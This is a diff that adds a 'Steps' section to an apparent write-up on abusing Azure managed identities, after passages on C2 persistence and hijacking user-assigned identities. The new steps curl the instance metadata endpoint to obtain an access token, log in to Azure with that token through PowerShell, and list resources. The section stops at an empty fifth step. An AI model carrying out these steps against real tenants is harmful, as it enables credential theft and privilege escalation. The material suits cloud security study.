@@ -34,7 +34,7 @@ If an attacker compromises a resource and that resource's managed identity has w
 Create persistent scripts or backdoors
 
 Establish scheduled tasks that keep calling external C2 (command and control) servers
-
+  
 ### 5. Misuse of User-Assigned Managed Identities (UAMI)
 
 User-assigned MIs can be attached/detached from different resources. If an attacker finds a UAMI with high privileges:
@@ -42,3 +42,26 @@ User-assigned MIs can be attached/detached from different resources. If an attac
 They could attach it to a compromised resource (like a VM they control)
 
 Use the new token to escalate privileges or exfiltrate data
+
+## Steps
+
+### 1) Get an Azure access token from a VM
+
+    curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+      -H "Metadata: true"
+
+
+### 2) Run PowerShell
+
+    powershell
+
+### 3) Use the Azure Module to connect to Azure
+
+    PS> Install-Module -Name Az -Repository PSGallery -Force
+    PS> Connect-AzAccount -AccessToken <access_token> -AccountId <client_id>
+
+### 4) Retrieve information about Azure resources in our subscription
+
+    Get-AzResource
+
+### 5) 
